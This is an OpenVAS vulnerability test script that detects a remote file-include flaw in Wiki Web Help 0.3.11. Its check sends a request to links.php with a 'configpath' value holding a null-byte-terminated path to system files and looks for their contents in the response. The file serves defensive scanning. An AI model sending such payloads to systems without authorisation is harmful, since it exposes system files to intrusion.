###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wwh_55387.nasl 12 2013-10-27 11:15:33Z jan $
#
# Wiki Web Help 'configpath' Parameter Remote File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Wiki Web Help is prone to a remote file-include vulnerability because
it fails to sufficiently sanitize user-supplied input.

Exploiting this issue could allow an attacker to compromise the
application and the underlying system; other attacks are also
possible.

Wiki Web Help 0.3.11 is vulnerable; other versions may also be
affected.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103562";
CPE = "cpe:/a:wikiwebhelp:wiki_web_help";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(55387);
 script_version ("$Revision: 12 $");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

 script_name("Wiki Web Help 'configpath' Parameter Remote File Include Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/55387");
 script_xref(name : "URL" , value : "http://wikiwebhelp.org/");
 script_xref(name : "URL" , value : "http://sourceforge.net/projects/wwh/");

 script_tag(name:"risk_factor", value:"Medium");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-09-10 11:39:24 +0200 (Mon, 10 Sep 2012)");
 script_description(desc);
 script_summary("Determine if it is possible to read local files");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("gb_wwh_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("WWH/installed");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!get_port_state(port))exit(0);

if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

files = traversal_files();

foreach file (keys(files)) {

  url = dir + '/pages/links.php?configpath=/' + files[file] + '%00';

  if(http_vuln_check(port:port, url:url,pattern:file)) {
    security_warning(port:port);
    exit(0);
  }  

}  

exit(0);
